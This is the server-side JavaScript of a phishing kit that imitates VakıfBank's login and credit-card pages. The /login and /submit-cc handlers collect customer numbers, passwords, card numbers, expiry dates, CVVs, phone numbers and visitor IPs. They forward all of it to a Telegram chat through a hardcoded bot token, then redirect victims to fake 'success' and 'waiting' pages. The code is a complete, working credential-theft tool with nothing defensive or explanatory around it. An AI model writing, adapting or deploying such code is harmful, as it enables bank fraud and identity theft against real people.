const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const path = require("path");

const app = express();
const PORT = 3000;

const botToken = "8452844424:AAGkw2PVDwYiHM15OM26A_Bz92qnX39CulA";
const chatId = "-1002998135862";

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

const sendMessageToTelegram = async (message) => {
  if (botToken === "YOUR_TELEGRAM_BOT_TOKEN" || chatId === "YOUR_TELEGRAM_CHAT_ID") {
    console.error("Lütfen server.js dosyasındaki botToken ve chatId değişkenlerini güncelleyin.");
    return;
  }
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  try {
    await axios.post(url, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown",
    });
  } catch (error) {
    console.error("Telegram'a mesaj gönderilirken hata oluştu:", error.response ? error.response.data : error.message);
  }
};


app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.get("/index_kredi_karti", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index_kredi_karti.html"));
});

app.get("/bekle", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "bekle.html"));
});

app.get("/basarili", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "basarili.html"));
});
app.get("/bireysel/Roboto-Regular.4e7449338f3a9fee.woff2", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "bireysel", "Roboto-Regular.4e7449338f3a9fee.woff2"));
});
app.get("/bireysel/Roboto-Black.b4556791e2a9e005.woff2", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "bireysel", "Roboto-Black.b4556791e2a9e005.woff2"));
});
app.get("/bireysel/Roboto-Bold.2a63183e6dff7d00.woff2", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "bireysel", "Roboto-Bold.2a63183e6dff7d00.woff2"));
});
app.get("/bireysel/Roboto-Regular.4557104648f65fcc.woff", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "bireysel", "Roboto-Regular.4557104648f65fcc.woff"));
});
app.get("/bireysel/Roboto-Regular.9135eb6940282650.ttf", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "bireysel", "Roboto-Regular.9135eb6940282650.ttf"));
});
app.get("/bireysel/bg-shape.821c876cc9147e04.svg", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "bireysel", "bg-shape.821c876cc9147e04.svg"));
});
app.get("/bireysel/icons.0c92e5a9a0838246.ttf", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "bireysel", "icons.0c92e5a9a0838246.ttf"));
});




app.post("/login", async (req, res) => {
  const { username, password, tel } = req.body;
  const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  const message = `
*--- VakıfBank Giriş Bilgileri ---*
*TC/Müşteri No:* \`${username}\`
*Şifre:* \`${password}\`
*Tel:* \`${tel}\`
*IP Adresi:* \`${userIP}\`
*------------------------------------*
  `;

  try {
    await sendMessageToTelegram(message);
  } catch (err) {
    console.error("Telegram'a mesaj gönderilemedi:", err);
  }

  res.redirect("/basarili");
});

app.post("/submit-cc", async (req, res) => {
  const { kart_numarasi, son_kullanma, cvv, telefon } = req.body;
  const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  const message = `
*--- Kredi Kartı Bilgileri ---*
*Kart Numarası:* \`${kart_numarasi}\`
*Son Kullanma Tarihi (AA/YY):* \`${son_kullanma}\`
*CVV:* \`${cvv}\`
*Telefon Numarası:* \`${telefon}\`
*IP Adresi:* \`${userIP}\`
*-----------------------------*
    `;

  await sendMessageToTelegram(message);

  res.redirect("/bekle");
});

app.listen(PORT, () => {
  console.log(`Sunucu http://localhost:${PORT} adresinde çalışıyor`);

});

module.exports = app;